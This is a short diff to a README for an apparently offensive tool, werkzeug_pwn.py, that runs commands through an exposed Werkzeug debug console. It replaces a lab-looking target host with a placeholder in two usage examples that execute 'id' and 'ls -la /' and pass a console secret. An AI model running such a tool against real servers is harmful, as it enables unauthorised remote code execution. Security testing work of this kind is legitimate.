@@ -74,7 +74,7 @@ This is the most common use case. You provide the path that triggers the Werkzeu
 **Example:**
 
 ```bash
-./werkzeug_pwn.py http://ptl-ea1774a1ecbc.libcurl.me/ "id" --exploit-path /console
+./werkzeug_pwn.py http://VULN-WEBSITE.com "id" --exploit-path /console
 ```
 
 ### Scenario 2: Provide a Known SECRET and Execute Command
@@ -88,7 +88,7 @@ If you have already discovered the `SECRET` PIN, you can provide it directly to 
 **Example:**
 
 ```bash
-./werkzeug_pwn.py http://ptl-ea1774a1ecbc.libcurl.me/ "ls -la /" --secret M1hM1fnGaPJcYnDo5i5u
+./werkzeug_pwn.py http://VULN-WEBSITE.com "ls -la /" --secret M1hM1fnGaPJcYnDo5i5u
 ```
 
 ---
